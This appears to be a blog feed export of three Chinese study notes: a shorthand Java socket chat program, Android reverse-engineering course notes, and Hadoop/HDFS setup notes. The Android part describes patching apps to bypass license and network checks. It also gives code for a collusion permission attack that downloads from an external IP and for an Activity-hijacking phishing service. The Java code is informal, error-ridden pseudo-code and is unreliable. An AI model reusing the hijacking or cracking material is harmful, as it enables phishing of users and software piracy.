    <content type="text"><![CDATA[JavaSE-网络编程 并发一高，会导致通讯变慢等情况。 解决这一问题，可以通过java nio编程，即非阻塞方式，即通道channel和选择器selector来搞定。 NetChartDemo_1 src com.ztl.controler SystemController();//系统启动器 com.ztl.iface.parser IMessageParser(); com.ztl.iface.thread IServerSocketThread(); com.ztl.impl.parser MessageParserImpl(); com.ztl.impl.thread ServerSocketThreadImpl(); //改名为SocketServerRunnableImpl(); ClientSocketRunnable(); //改名为ServerClinetRunnable(); UserClientSocketRunnable(); //copy ClientSocketRunnable(); DaemonThread(); //守护线程部分，负责打印统计信息，报告信息等 com.ztl.manager MessageQueueManager(); //消息队列管理器 MessageParserManager(); //消息解析器 com.ztl.pojos MessageQueuePojo(); //消息队列pojo类 com.ztl.utils SystemParas(); //系统参数配置工具类 ReadConfigUtils(); //读取配置文件的工具类 StaticValue(); //静态变量定义工具类 test //测试 Source Folder resources //配置文件夹 Source Folder application.properties. lib application.properties: #net chat config node_master=true # node_master=false server_socket_port=9999 server_socket_wait_accept_max_pool=5 nick_name=天亮教育 server_socket_ip = 127.0.0.1 max_connection_client_number=10 pubilc class ReadConfigUtil{ private Properties config = null; public ReadConfigUtil(String configFile){ InputStream in = ReadConfigUtil.class.getClassLoader() .getResourceAsStream(&quot;application.properties&quot;); config = new Properties(); try{ Reader reader = new InputStreamReader(in,StaticValue.default_encoding)); config.load(reader); reader.close(); }catch(IOException e){ sout(&quot;none properties&quot;); } } //根据key读取value public String getValue(String key){ // Properties props = new Properties(); try{ String value = config.getProperty(key); return value; }catch(Exception e){ e.printStackTrace(); sout(&quot;ConfigInfoError&quot; + e.toString()); return null; } } psvm(){ sout(); } } public class SystemParas{ //初始化配置文件读取类 public static ReadConfigUtil configUtil = new ReadConfigUtil(&quot;application.properties&quot;); //读取出各配置项，以备任何该项目中的类使用 public static boolean is_node_master = Boolean.parserBoolean(configUtil.getValue(&quot;node_master&quot;)); public static String nick_name = configUtil.getValue(&quot;nick_name&quot;); public static int max_connection_client_number = Integer.parserInt(configUtil.getValue(&quot;max_connection_client_number&quot;)); public static int server_socket_port = Integer.parserInt(configUtil.getValue(&quot;server_socket_port&quot;)); public static int server_socket_wait_accept_max_pool = Integer.parserInt(configUtil.getValue(&quot;server_socket_wait_accept_max_pool&quot;)); public static String server_socket_ip = configUtil.getValue(&quot;server_socket_ip&quot;); main(){ sout(configUtil.getValue(&quot;nick_name&quot;)); sout(configUtil.getValue(&quot;node_master&quot;)); sout(configUtil.getValue(&quot;max_connection_client_number&quot;)); } } public class StaticValue{ public static String default_encoding = &quot;utf-8&quot;; public static String sepratar_next_line = &quot;\n&quot;; } socket server: public interface IServerSocketThread{ } public class ServerSocketThreadImpl implements Runnable{ private String nickName; private ServerSocket serverSocket; private MessageQueueManager messageQueueManager; //private ThreadGroup threadGroup; //线程组，用来统一管理client，socket的各个线程 private List&lt;ServerClientSocketRunnable&gt; serverClientList; private boolean isRunning = true; //状态位 public ServerSocketThreadImpl(String nickName,ServerSocket serversocket){ this.nickName = nickName; this.serverSocket = serverSocket; messageQueueManager = new MessageQueueManager(); //开启管理员向user client端发送消息 AdminWriteMessageRunnable adminWriteMessageRunnable = new AdminWriteMessageRunnable(messageQueueManager); new Thread(adminWriteMessageRunnable).start(); //this.threadGroup = new ThreadGroup(&quot;socket_client_group&quot;); serverClientList = new LinkedList&lt;ServerClientSocketRunnable&gt;(); this.isRunning = true; //在socket server启动守护线程 DaemonThread daemonThread = new DaemonThread(serverClientList,messageQueueManager); new Thread(daemonThread).start(); } setter and getter //实现server socket的主要处理逻辑即可 @Override public void run(){ while(isRunning){ Socket client_socket = null; try{ client_socket = serverSocket.accept(); //下一步封装后再加进线程组 //即server client线程 ClientSocketRunnable clientSocketRunnable = new ClientSocketRunnable( null,client_socket,this.messageQueueManager); this.serverClientList.add(clientSocketRunnable); new Thread(clientSocketRunnable).start(); sout(&quot;one client is online!&quot;); }catch(){ xxx } } } // 管理员要写给各客户端的runnable类 class AdminWriteMessageRunnable implements Runnable{ private MessageQueueManager messageQueueManager; private BufferedReader bufferReader; private boolean isRunnable = true; public AdminWriteMessageRunnable(MessageQueueManager messageQueueManager){ this.messageQueueManager = messageQueueManager; this.isRunnable = true; try{ this.bufferReader = new BufferedReader(new InputStreamReader(System.in.getInputStream(), StaticValue.default_encoding)); }catch(){ xxx } } @Override public void run(){ String temp_line = null; while(isRunnable){ try{ temp_line = this.bufferReader.readLine(); sout(&quot;admin by server to client---&quot; + temp_line); }catch(){ xxx } } } } } //server clinet runnable. 改名为ServerClientSocketRunnable public class ClientSocketRunnable implements Runnable{ private Socket clientSocket; private String nickName; //这里如果想随意写或者随意读，就要独立出来 private BufferedWriter bufferWriter; private BufferedReader bufferReader; setter and getter //封装的由server client向user client发送消息的方法 public void writerToUserClient(String message){ try{ this.bufferWriter.write(message); this.bufferWriter.flush(); }catch(){ xxx } } private MessageParserManager messageParserManager; private boolean isRunnable = true; private MessageQueueManager messageQueueManager; public ClientSocketRunnable(String nickName, Socket clientSocket,MessageQueueManager messageQueueManager){ this.nickName = nickName; this.clientSocket = clientSocket; this.messageParserManager = new MessageParserManager(); this.messageQueueManager = messageQueueManager; this.isRunnable = true; try{ this.bufferReader = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream(), StaticValue.default_encoding)); this.bufferWriter = new BufferedWriter((new OutputStreamWriter(this.clientSocket.getOutpuStream, StaticValue.default_encoding)); }catch(){ xxx } } @Override public void run(){ String temp_line = null; while(isRunnable){ try{ temp_line = this.bufferReader.readLine(); messageQueueManager.addOneMessage(temp_line); sout(&quot;server from client message----&quot; + temp_line); }catch{ } } } /* class ServerClientWriteRunnable implements Runnable{ private BufferedWriter bufferWriter; public ServerClientWriteRunnable(BufferedWriter bufferWriter){ } } */ } public class UserClientSocketRunnable implements Runnable{ private Socket clientSocket; private String nickName; //这里如果想随意写或者随意读，就要独立出来 private BufferedWriter bufferWriter; private BufferedReader bufferReader; private BufferedReader consoleBufferReader; private MessageParserManager messageParserManager; private boolean isRunnable = true; private MessageQueueManager messageQueueManager; public ClientSocketRunnable(String nickName, Socket clientSocket,MessageQueueManager messageQueueManager){ this.nickName = nickName; this.clientSocket = clientSocket; this.messageParserManager = new MessageParserManager(); this.isRunnable = true; try{ this.consoleBufferReader = new BufferedReader(new InputStreamReader(System.in.getInputStream(), StaticValue.default_encoding)); this.bufferReader = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream(), StaticValue.default_encoding)); this.bufferWriter = new BufferedWriter((new OutputStreamWriter(this.clientSocket.getOutpuStream, StaticValue.default_encoding)); //开启从服务端读取消息线程 ReadSocketServerRunnable readSocketServerRunnable=new ReadSocketServerRunnable(this.bufferReader); new Thread(readSocketServerRunnable).start(); }catch(){ xxx } } @Override public void run(){ String temp_line = null; while(isRunnable){ try{ temp_line = this.consoleBufferReader.readLine(); this.bufferWriter.write(temp_line + StaticValue.sepratar_next_line); this.bufferWriter.flush(); sout(&quot;client to server message----&quot; + temp_line); }catch{ } } } class ReadSocketServerRunnable implements Runnable{ private BufferedReader bufferReader; private boolean isRunning = true; public ReadSocketServerRunnable(BufferedReader bufferReader){ this.bufferReader = bufferReader(); isRunning = true; } @Override public void run(){ String temp_line = null; while(isRunning){ try{ temp_line = this.bufferReader.readLine(); sout(&quot;server to client---&quot; + temp_line); }catch(){ xxx } } } } } public class DaemonThread implements Runnable{ //持有所有客户端socket线程 //private ThreadGroup threadGroup; private List&lt;ServerClientSocketRunnable&gt; serverClientList; //待向所有客户端发送消息的消息队列管理器 private MessageQueueManager messageQueueManager; private boolean isRunning = true; pubilc DaemonThread(List&lt;ServerClientSocketRunnable&gt; serverClientList,MessageQueueManager messageQueueManager){ //this.threadGroup = threadGroup; this.serverClientList = serverClientList; this.messageQueueManager = messageQueueManager; this.isRunning = true; } @Override public void run(){ String message = null; while(isRunning){ message = messageQueueManager.getOneMessage(); //这里可能会有异常，解决方法：加锁 for(ServerClientSocketRunnable serverClientSocketRunnable:serverClientList){ serverClientSocketRunnable.writeToUserClient(message+StaticValue.sepratar_next_line); } sout(&quot;daemon by server to client-- &quot; + message); } } } public class MessageQueuePojo{ private LinkedList&lt;String&gt; messageList; setter and getter public MessageQueuePojo(){ this.messageList = new LinkedList&lt;String&gt;(); } public void addMessage(String oneMeassage){ sychronized(this){ this.messageList.add(oneMessage); this.notifyAll();//多个用户 } } public String popMessage(){ String message = null; sychronized(this){ message = this.messageList.poll(); while(message == null){ try{ this.wait(); }catch(){ } message = this.messageList.poll(); } return message; } } } pubilc class MessageQueueManager{ private MessageQueuePojo messageQueue; public MessageQueueManager(){ this.messageQueue = new MessageQueuePojo(); } public String getOneMessage(){ return this.messageQueuePojo.popMessage(); } public void addOneMessage(String message){ this.messageQueuePojo.addMessage(message); } } public class SystemController{ psvm(){ if(SystemParas.is_node_master){//说明是服务节点 //port会被绑定，不需要bind ServerSocket serverSocket = new ServerSocket(SystemParas.server_socket_port,SystemParas.server_socket_wait_accept_max_pool) ServerSocketThraadImpl serverSocketRunnable = new ServerSocketThreadImpl( SystemParas.nick_name,serverSocket); Thread serverThread = new Thread(serverSocketRunnable); serverThread.start(); sout(&quot;socket server have started&quot;); }else{//说明是socket client节点 //这里测试的时候，要先开启server服务，再把node_master改为false。当client启动成功的时候，会反馈一条信息给server端 Socket socket = new Socket(SystemParas.server_socket_ip,SystemParas.server_socket_port); ClientSocketRunnnable clientSocketRunnable = new ServerSocketThreadImpl( SystemParas.nick_name,serverSocket); Thread serverThread = new Thread(clientSocketRunnable); serverThread.start(); sout(&quot;socket client have started&quot;); } } } public interface IMessageParser{ public String parser(String message); } public class MessageParserImpl implements IMessageParser{ @Override public String parser(String message){ return null; } } public class MessageParserManager{ private IMessageParser iMessageParser; public MessageParserManager(){ this.iMessageParser = new MessageParserImpl(); } pubilc String parser(String content){ return this.iMessageParser.parser(content); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[android逆向学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2Fandroid%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[android逆向分析-i春秋 基础 bitxiongxi@qq.com //note01 一.Dalvik虚拟机 二.静态分析 三.静态分析应用：应用破解与系统攻击 《Android软件安全与逆向分析》丰生强著 android系统架构： linux内核： （软件与硬件之间的一层，提供驱动） Display Driver Camera Driver Flash Memory Driver Binder(IPC) Driver Keypad Driver WiFi Driver Audio Driver Power Management .... Libraries（系统库）(C/C++写的) Surface Manager Media Framework SQLite OpenGL | ES FreeType WebKit SGL SSL libc (重点)Andrioid Runtime Core Libraries（支持java语言的jar包） Dalvik Virtual Machine （Dalvik虚拟机，类似jvm） （每启动一个程序的时候，都会创建一个Dalvik实例） Application Framework（应用程序框架，一堆API）(正向开发) Activity Manager Window Manager Content Providers View System Package Manager Telephony Manager Resource Manager Location Manager Notification Manager Applications Home Contacts Phone Browser ... Android基础，java基础，信息安全基础 //note02 Dalvik虚拟机（DVM） DVM和JVM的区别： ·JVM运行的是Java字节吗，DVM运行的是Dalvik字节码 ·Dalvik可执行文件（.dex）体积更小 ·虚拟机架构不同：JVM基于栈，DVM基于寄存器（用来暂时存储运算的中间器） reg： Java代码： public class Hello{ public int foo(int a,int b){ return (a+b)*(a-b); } main(){ Hello hello =new Hello(); sout(hello.foo(5,3)); } } (仅针对foo这个函数) Java字节码： public int foo(int,int); Code: 0: iload_1 (i:int;load:将变量的值压到栈上；把第一个值压到栈上) 1: iload_2 2: iadd (栈上的1，2两个值相加,把结果再压出栈) 3: iload_1 4: iload_2 5: isub （相减，压出栈） 6: imul （相乘，相乘） 7: ireturn （返回） Dalvik字节码： Hello.foo:(II)I （函数的定义，II：两个参数都是int类型，I：返回值也是int类型） 0000: add-int v0,v3,v4 （v3和v4的值相加，再将值存到v0里面） 0002: sub-int v1,v3,v4 （相减，存到v1里面） 0004: mul-int/2addr v0,v1 （乘法，然后存到v0里面） 0005: return v0 （返回v0） Dalvik汇编语言简介： v命名法和p命名法 （通常使用的是p命名法） v命名法 p命名法 寄存器含义 v0 v0 第1个局部变量寄存器 v1 v1 第2个局部变量寄存器 ... ... 中间的局部变量寄存器 vM-N p0 第1个参数寄存器（通常为调用对象） ... ... 中间的参数寄存器 vM-1 pN-1 第N个参数寄存器 reg： 3个局部变量和4个函数参数(包括一个this) v0,v1,v2 p0(this),p1,p2,p3 类型描述符： V void Z boolean B byte S short C char I int J long F float D double L java类 [ 数组 寄存器 ·DVM寄存器都是32bit的，与名称无关 ·J，D类型，需要相邻2个寄存器 ·对象类型：Ljava/lang/String；=java.lang.String ·数组：[I=int[].[[I=int[][] 方法： ·格式：Lpackage/name/ObjectName（类名）;-&gt;MethodName(III)Z (III:3个int参数，返回boolean参数) ·例子： method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String 等价于 String method(int,int[][],int,String,Object[]) 字段： 格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String 程序编译与反编译 class-&gt;dx-&gt;（dex文件；apk包，资源文件，androidManifest.xml）-&gt;baksmali-&gt;smali文件 dex就可以运行了 baksmali反编译工具 apk类似打包程序-&gt;解压 androidManifest.xml 配置文件 主要的反编译器： ·BakSmali（主要用这个） ·Dedexer Dalvik指令集 空操作指令：nop 数据操作指令：move move vA,vB 将vB寄存器的值赋给vA寄存器，源寄存器与目的寄存器都为4位 move-&gt;object/from 16 vAA,vBBBB 为对象赋值。源寄存器为8位，目的寄存器为16位 HelloWorld.smali .class public LHelloWorld; .super Ljava/lang/Object; .method public static main([Ljava/lang/String;)V (V:void) .registers 4 (表示4个寄存器) .parameter (参数是空) .prologue (函数实际执行内容) #空指令 nop nop nop nop #数据定义指令 const/16 v0,0x8 (把8放到v0里面) const/4 v1,0x5 const/4 v2,0x3 #数据操作指令 move v1, v2 （将v2值放到v1里面） #数组操作指令 new-array v0, v0, [I （创建一个数组，大小是第二个v0，类型是int数组，放入第一个v0里） array-length v1, v0 （将v0的长度放入v1） #实例操作指令 new-instance v1, Ljava/lang/StringBuilder; #方法调用指令 invoke-direct {v1},Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V #跳转指令 if-nez v0, :cond_0 (nez:not equals zero;如果不为0，则跳到cond_0) goto : goto_0 (如果为0，则跳到goto_0) :cond_0 #数据转换指令 int-to-float v2, v2 #数据运算指令 add-float v2, v2, v2 #比较指令 cmpl-float v0, v2, v2 (v2和v2比较的结果如果想等则返回0) #字段操作指令 sget-object v0, Ljava/lang/System:-&gt;out:Ljava/io/PrintStream; (获取System里面的out变量放入v0) const-string v1, &quot;hello world&quot; #构造字符串 （定义一个字符串放入v1） #方法调用指令 invoke-virtual {v0,v1},Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V #返回指令 :goto_0 return-void .end method 工具 ApkIDE（apk改之理） ApkToolkit jd-gui.exe Dalvik版的Hello World ·编译smali文件 java -jar smali.jar -o classes.dex HelloWorld.smali (-o:输出到classes.dex) ·执行程序 上传到手机：adb push classes.dex /data/local/ 执行程序：adb shell dalvikvm -cp /data/local/classes.dex HelloWorld ApkToolkit 将classes.dex-&gt;classes_dex.jar jd-gui.exe 查看jar文件 //note03 静态分析 ·定义： 不运行代码的情况下（相对的），阅读反汇编代码来掌握程序功能的一种技术 ·两种方法： 1.阅读Dalvik字节码（通过baksmali反编译dex文件生成smali文件） 2.阅读java代码（通过dex2jar生成jar文件，再jd-gui阅读jar文件） 定位关键代码 常用步骤 1.反编译apk (一般反编译成smali) 2.通过AndroidManifest.xml查找主Activity &lt;activity android:label=&quot;@string/title_activity_main&quot; android:name=&quot;.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; #MAIN :主Activity &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; #LAUNCHER :通过该Activity启动,即首先进入的activity &lt;/intent-filter&gt; &lt;/activity&gt; 3.查看程序的入口函数：主Activity的OnCreate() 4.查看Application类（全局，早于其他类启动）的OnCreate()函数。该函数通常用作授权检测 //.MainActivity 类名 title_activity_main 标题 定位关键代码： 常用方法： ·信息反馈法：运行时信息 ·特征函数法：运行时行为 ·顺序查看法：执行流程 ·代码注入法：添加Log reg smali文件格式： .class public Lcom/droider/crackme0502/MainActivity; .super Landroid/app/Activity .source &quot;mainActivity.java&quot; # instance fields .field private btnAnno:Landroid/widget/Button; .field private btnCheckSN:Landroid/widget/Button; .field private edtSN:Landroid/widget/EditText; # direct methods （直接方法） .method public constructor&lt;init&gt;()V (构造函数) .locals 0 （局部变量0个） .prologue .line 19 invokde-direct {p0},Landroid/app/Activity;-&gt;&lt;init&gt;()V （p0：当前这个对象this) return-void .end method 内部类的表示 ·MainActivity$1.smali:匿名内部类，多用于程序中的响应 ·MainActivity$SNChecker.smali:成员内部类 ·MainActivity.smali:外部类 ·this$0是内部类自动保留的一个指向所在外部类的引用。this表示父类的引用，右边的0便是引用的层数 ·例： public class Outer{ //this$0 public class FirstInner{ //this$1 pulblic class SecondInner{ //this$2 public class ThirdInner{} } } } ·this$X型字段都被指定了synthetic(合成)属性，表明他们是被编译器合成的，虚构的，非java代码指定的字段 内部类的表示： 构造函数执行步骤： 1.保存外部类的引用到本类的一个synthetic字段中 2.调用内部类的父类的构造函数 3.内部类自身初始化 reg：内部类，构造函数 .class public Lcom/droider/crackme0502/MainActivity$SNChecker;(成员内部类) .super Ljava/lang/Object .source &quot;mainActivity.java&quot; # instance fields .field private sn:Ljava/lang/String;（sn:一般指验证码） .field final synthetic this$0:Lcom/droider/crackme0502/MainActivity; #direct methods .method public constructor&lt;init&gt;(Lcom/droider/crackme0502/MainActivity;Ljava/lang/String;)V .locals 0 .param p2, &quot;sn&quot; # Ljava/lang/String; .prologue .line 83 #将外部类引用赋给p1 iput-object p1,p0, Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;this$0:Lcom/droider/crackme0502/MainActivity; #调用SNCheck的基类Object的构造函数 invoke-direct{p0},Ljava/lang/object;-&gt;&lt;init&gt;()V .line 84 #调用SNCheck自身的构造函数 iput-object p2,p0 Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;sn:Ljava/lang/String; .line 85 return-void .end method //note04 应用破解 ·试用版软件 ·网络验证 安卓模拟器： Eclipse自带有 BlueStatcks 将apk拖入BlueStatcks 将apk拖入ApkIDE crypt.smali (加密解密) R.smali（资源文件） MainActivity.smali onCreate(){} .locals 4 .param p1,&quot;xxx&quot; ... checkappKey()Z move-result v2 (将结果保存到v2里面) if-nez v2, :cond_2 ... :cond_2 const v2, 0x7f03001 (是一个资源编号) (右边有搜索,将编号放入可以搜一下) getAppKey() decryptAppkey() (解密函数) 这里会有一个跳转 if-ne v0,v2 :cond_3 (如果密钥匹配，就跳到cond_3) 在未授权的时候直接强行将其置成专业版的key值 保存-&gt;编译-&gt;生成xxx.apk 网络验证例子： 使用前会先去网络验证是否是正版，如果不通过可能不会让使用 想断网的时候验证能不能通过： 360-&gt;演示-&gt;手机操作 apkIDE-&gt;apk拖入 onClick(): getData() new-instance: v1, Ljava/lang/Thread; 可以直接删掉cond_0 ,return-void 编译-&gt;保存 //note05 系统攻击 ·手机ROOT及其危害 ·串谋权限攻击 ·组件安全 什么是ROOT？ 在手机使用过程中获取操作系统root权限，即最高管理员权限 手机root及其危害 root的危害 ·系统不稳定 ·病毒入侵 ·隐私数据暴露 权限攻击 串谋权限攻击 （联网下载文件并保存到SD卡上） 程序1的组件2不允许 程序2的组件1允许 程序1的组件2在没有权限的情况下，通过程序2的组件1联网并保存数据到SD卡 reg： Download.apk (有权限) EvilDownload.apk(没有权限) 在Download.apk最小化的时候，点开EvilDownload就实现了串谋攻击，就可以下载东西了 &lt;uses-permission android:name=&quot;android.permission.WRITE_EXERNAL_STORAGE&quot; /&gt; (写入外置SD卡权限) &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; （访问网络的权限） 没有这两个的话是没有相应权限的 MainActivity(): public void onCreate(Bundle savedInstanceState){ super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); setTitle(&quot;串谋攻击演示程序&quot;); btn1 = (Button)findViewById(R.id.button1); btn1.setOnClickListener(new OnClickListener(){ public void onClick(View v){ Intent intent = new Intent(); //创建Intent对象 intent.setAction(&quot;com.droider.download&quot;); intent.putExtra(&quot;url&quot;,&quot;http://114.215.197.165/Struts2Login/ info.txt&quot;); //要下载的文件URL String fileName = &quot;info.txt&quot;; //保存的文件名 intent.putExtra(&quot;filename&quot;,filename); sendBroadcast(intent); //发送广播 } } }); public class DownloadManager extends BroadcastReceiver{ @Override public void onReceive(Context context,Intent intent){ if(intent.getAction().equals(&quot;com.droider.download&quot;)){ String url = intent.getExtras().getString(&quot;url&quot;); String fileName = intent.getExtras().getString(&quot;filename&quot;); Toast.makeText(context,url,Toast.LENGTH_SHORT).show(); MyAsyncTask task = new MyAsyncTask(); task.execute(url,fileName); } } } Activity劫持 步骤： 1.遍历运行中的程序 2.恶意程序启动带FLAG_ACTIVITY_NEW_TASK标志的钓鱼式Activity覆盖正常的Activity 3.用户在伪造的界面上进行操作 4.恶意程序将信息发送到指定的网址 5.切换到原来的Activity public class Hijacker extends Service{ private boolean started = false; private List&lt;String&gt; mhijackingList; //劫持的进程列表 private Timer mTimer = new Timer(); private TimerTask mTask = new TimerTask(){ @Override public void run(){ Log.d(&quot;com.droider.hijacker&quot;,&quot;timertask start...&quot;); ActivityManager am = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE; started = true; List&lt;RunningAppProcessInfo&gt; infos = am.getRunningAppProcesses();//枚举正在运行的进程列表 for(RunningAppProcessInfo psinfo: infos){ if(psinfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND)//前台进程 if(mhijackingList.contains(psinfo.processName)){ Log.d(&quot;com.droider.hijacker&quot;,&quot;hijacking start...&quot;); Intent intent = new Intent(getBaseContext(),HijackActivity.class); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); intent.putExtra(&quot;processname&quot;,psinfo.processName); getApplication().startActivity(intent);//启动伪造的Activity } } } } @Override public int onStartCommand(Intent intent,int flags,int startId){ Log.d(&quot;com.droider.jijacker&quot;,&quot;service start..&quot;); mhijackingList = ((MyApp)getApplication()).hijackingList; if(!started) mTimer.scheduleAtFixedRate(mTask,2000,1500);//定时检查启动的进程列表中是否有被劫持的程序 return super.onStartCommand(intent,flags,startId); } } public class MyApp extends Application{ List&lt;String&gt; hijackingList; @Override public void onCreate(){ hijackingList = new ArrayList&lt;String&gt;(); hijackingList.add(&quot;com.android.music&quot;); hijackingList.add(&quot;com.android.browser&quot;);//要劫持的进程 super.onCreate(); } } public class HijackActivity extends Activity{ private TextView tv; @Override public void onCreate(Bundle savedInstanceState){ super.onCreate(savedInstanceState); setContentView(R.layout.activity_hijack); setTitle(&quot;Activity劫持页面&quot;)； tv=(TextView)findViewById(R.id.tv_process); tv.setTextColor(Color.RED); tv.setText(&quot;被劫持的进程：&quot;); Bundle bundle = getIntent().getExtras(); if(bundle != null){ if(bundle.containsKey(&quot;processname&quot;)){ String str = bundle.getString(&quot;processname&quot;); tv.setText(&quot;被劫持的进程：&quot;+str); } } } @Override public boolean onTouchEvent(MotionEvent event){ Intent intent = new Intent(HijackActivity.this,Hijacker.class); stopService(intent); //停止劫持服务 moveTaskToBack(true); return super.onTouchEvent(event); } } //可以让程序不在最近访问的程序列表里面 特点：不需要声明任何权限，一般杀毒软件无法检测]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>逆向</category>
        <category>Android</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>Android</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据学习笔记01-hadoop]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-hadoop%2F</url>
    <content type="text"><![CDATA[Hadoop--炼数成金 //note01 Hadoop介绍与安装 。。。 倒排索引 （1；1） 单词出现在标识号为1的网页的编辑量是第1的位置 分词难度： 字典； Page Rank 用于给每个网页价值评分 Map-reduce思想： 计算PR Lucene hadoop的起源，提供了全文检索引擎的架构 nutch HBase 列式存储（面向数据分析）（提高响应速度及I/O） Namenode HDFS的守护程序 记录文件是如何分割成数据块的，以及这些数据块被存储到哪些节点上 对内存和I/O进行集中管理 是个单点，发生故障将使集群崩溃 Secondary Namenode 监控HDFS状态的辅助后台程序 每个集群都有一个 与NameNode进行通讯，定期保存HDFS元数据快照 当NameNode故障可以作为备用NameNode使用 DataNode 每台从朋务器都运行一个 负责把HDFS数据块读写到本地文件系统 JobTracker 用于处理作业(用户提交代码)的后台程序 决定有哪些文件参不处理，然后切割task幵分配节点 监控task，重启失败的task(于不同的节点) 每个集群只有唯一一个JobTracker，位于Master节点 TaskTracker 位于slave节点上，与datanode结合(代码与数据一起的原则) 管理各自节点上的task(由jobtracker分配) 每个节点只有一个tasktracker，但一个tasktracker可以启动多个JVM， 用于并行执行map或reduce仸务 与jobtracker交互 Master与Slave Master:Namenode、Secondary Namenode、Jobtracker。浏览器(用于观看管理界面)，其它Hadoop工具 Slave:Tasktracker、Datanode Master不是唯一的 安装： ssh-keygen -t rsa scp ./id_rsa.pub huang@192.168.04:/home/huang/.ssh (名称节点的服务器) hadoop/conf/hadoop-env.sh //只改JAVA_HOME就行 hadoop/conf/core-site.xml &lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://backup01:9000&lt;/value&gt; //指定名称节点位置 &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; //临时路径，不指定会默认用root下的./tmp目录，一定要设置这个参数 &lt;value&gt;/home/huang/hadoop/tmp&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; hadoop/conf/hdfs-site.xml &lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; //服务器因子 &lt;value&gt;1&lt;/value&gt; //2代表复制2份,1不复制 &lt;/property&gt; &lt;/configuration&gt; hadoop/conf/mapred-site.xml &lt;property&gt; &lt;name&gt;mapred.job.tracker&lt;/name&gt; &lt;value&gt;backup01:9001&lt;/value&gt; &lt;/property&gt; hadoop/conf/masters.xml //填master主机名称 hadoop/conf/slaves.xml //填slaves主机名称 vi /etc/hosts //检查防火墙 chkconfig iptables off (集群里面的配置几乎都一样) scp -r ./hadoop-1.1.2 huang@192.168.0.4:/home/huang/ 格式化名称节点： bin/hadoop namenode -format bin/start-all.sh //处理自己连自己免密码问题 .ssh id_rsa.pub -&gt; copy -&gt; authorized_keys 在末尾粘贴 bin/start-all.sh //启动所有的节点 //检查系统是否正常启动 /usr/jdk1.7.0_25/bin/jps //jps：java相关进程统计 伪分布式： 到本地自己给自己免密码： 只需要将.ssh/id_rsa.pub 复制成 authorized_keys CentOS,安装与编译有关的包： yum install svn //可以部署到其他服务器 yum install autoconfautomake libtool cmake yum install ncurses-devel yum install openssl-devel yum install gcc* 安装maven //优点：参数可以结构化写在一个xml里面 需要安装protobuf这个插件 /usr/local/bin/protoc svn mvn //之后有一个本地库问题 //测试hello world //建立一个子目录 mkdir input cd input/ echo &quot;hello world&quot; &gt; test1.txt echo &quot;hello hadoop&quot; &gt; test2.txt bin/hadoop fs -ls bin/hadoop fs -put ../input ./in //复制input到/.in bin/hadoop fs -ls bin/hadoop fs -ls ./in/* //hadoop是没有当前路径一说的 bin/hadoop fs -cat ./in/test1.txt jar包统计： bin/hadoop jar hadoop-examples-1.1.2.jar wordcount in out //out 输出文件名称 in 源文件名称 bin/hadoop fs -ls ./out /out/part-r-00000 //放的是结果 port:50070 port:50030 219.232.252.17:50070 CDH安装 //note02 HDFS 提供分布式存储机制，提供可线性增长的海量存储能力 自动数据冗余，无须使用Raid，无须另行备份 为进一步分析计算提供数据基础 MR在HDFS基础上进行快速分析 PC组成集群即可。在任何节点，只要发布操作命令，就可以对整个HDFS系统进行统一操作 //本地化数据计算，节省传输花费的时间，也是HDFS设计的原则所在 包含： NameNode DataNode 事务日志 映像文件 SecondaryNameNode cat tmp/dfs/name/current/VERSION namespaceID= //记录命名空间的标识号，就是整个集群的标识 cTime=0 //这个HDFS创建的时间 storageType=NAME_NODE //存储的类型 layoutVersion=-32 //-32 构造版本 还有影像文件，编辑日志 //每隔一段时间会有一个检查点将内存的数据写到fs里面实地保存 //edits会记录用户的各个操作，当系统如果有异常崩溃的话，系统恢复时它会先加载fsimage，调用edits重做一遍；如果写过一次fsimage，在这之前的操作就没用了； cat dfs/namesecondary/current/VERSION //备份 //blk开头的文件是数据块 一个文件的写是写到不同的datanode里面的 冗余副本策略 //在复制冗余副本的时候用户是不能操作的 机架策略 //机架一般放20多个服务器，每个机架之间用交换机相连，交换机通过一个上级交换机来连接；同一机架下的节点只经过一个交换机，所以传输速度快 core-site.xml //设置机架 心跳机制 //每隔一段时间给Namenode发送一次 安全模式 //安全模式下用户不能写数据，节点多的话可能会长达10多分钟 bin/hadoop dfsadmin -safemode enter //强制进入安全模式 校验和 blk_xxxx.meta //crc校验然后写到.meta文件里,缺省值512字节产生4个字节校验和 